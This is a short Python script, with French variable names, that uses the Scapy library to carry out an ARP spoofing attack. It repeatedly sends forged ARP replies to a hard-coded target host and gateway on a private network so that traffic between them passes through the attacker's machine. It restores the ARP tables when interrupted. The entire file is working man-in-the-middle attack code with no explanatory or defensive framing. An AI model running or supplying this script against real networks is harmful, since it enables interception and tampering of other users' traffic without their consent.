from scapy.all import ARP, send
import time


Ip_cible = "192.168.1.39"
Mac_cible = "00:0c:29:f3:e6:91"
Ip_passerelle ="192.168.1.1"
Mac_passerelle= "cc:19:a8:47:c6:0f"

def spoof(Ip_dst, Mac_dst,Ip_usurpé):
    packet=ARP(op=2, pdst=Ip_dst, hwdst= Mac_dst, psrc= Ip_usurpé)
    send(packet)
    print(Ip_dst)

def restore(Ip_dst, Ip_src, Mac_src):
    packet=ARP(op=2, pdst= Ip_dst, psrc= Ip_src, hwsrc= Mac_src )
    send(packet, count=4, verbose=False)



try:
    packets = 0

    while packets >= 0:
        spoof(Ip_cible,Mac_cible,Ip_passerelle)
        spoof(Ip_passerelle,Mac_passerelle,Ip_cible)

        time.sleep(1)
        
except KeyboardInterrupt:
    print("\n[+] Restoring ARP tables...")
    restore(Ip_cible, Ip_passerelle, Mac_passerelle)
    restore(Ip_passerelle, Ip_cible, Mac_cible)
    print("[+] ARP tables restored.")
